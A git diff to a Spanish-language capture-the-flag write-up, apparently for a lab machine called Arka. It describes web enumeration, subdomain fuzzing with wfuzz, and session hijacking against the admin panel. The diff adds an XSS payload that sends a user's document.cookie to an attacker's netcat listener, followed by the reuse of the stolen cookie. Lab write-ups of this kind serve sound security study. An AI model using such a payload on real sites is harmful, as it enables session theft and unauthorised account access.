@@ -23,39 +23,42 @@ hosts activos en el rango 192.168.182.0/24. El resultado mostró la máquina obj
 
 ![2](2.png)
 
-### Paso 3
+### Enumeración del Sitio Web
+ Al acceder al servicio web en http://192.168.182.138, encontramos una página de inicio 
+de Arka Construcciones con un formulario de contacto. Esto sugiere la posibilidad de 
+inyección de código en los campos del formulario.
 
 ![3](3.png)
 
-### Paso 4
-
 ![4](4.png)
 
-### Paso 5
+### Fuzzing de Subdominios
+ Utilizando wfuzz, descubrimos un subdominio administrativo en admin.arka.thl. Al visitar 
+la URL http://admin.arka.thl/login.php, encontramos un panel de autenticación.
 
 ![5](5.png)
 
-### Paso 6
-
 ![6](6.png)
 
-### Paso 7
-
+### Explotación de XSS y Secuestro de Sesión
+ Probamos una inyección de XSS en el formulario de contacto:
+ ````
+ <script>new Image().src='http://192.168.182.134:4444/?
+ cookie='+document.cookie</script>
+````
 ![7](7.png)
 
-### Paso 8
+ Al enviar este payload, logramos capturar la cookie de sesión de un usuario autenticado en nuestro 
+listener de netcat.
 
 ![8](8.png)
 
-### Paso 9
-
 ![9](9.png)
 
-### Paso 10
+ Regresamos al sitio web de autenticación e insertamos el valor de la cookie capturada y obtenemos 
+acceso al panel de administración.
 
 ![10](10.png)
-
-### Paso 11
 
 ![11](11.png)
 
